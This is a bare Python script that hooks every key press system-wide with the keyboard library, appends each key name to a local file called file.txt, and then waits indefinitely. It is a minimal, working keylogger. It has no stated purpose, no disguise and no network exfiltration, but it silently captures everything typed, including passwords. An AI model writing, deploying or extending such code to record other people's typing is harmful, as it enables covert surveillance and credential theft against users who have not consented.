import keyboard

def pressedkey(key):
    with open('file.txt','a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
keyboard.on_press(pressedkey)
keyboard.wait()
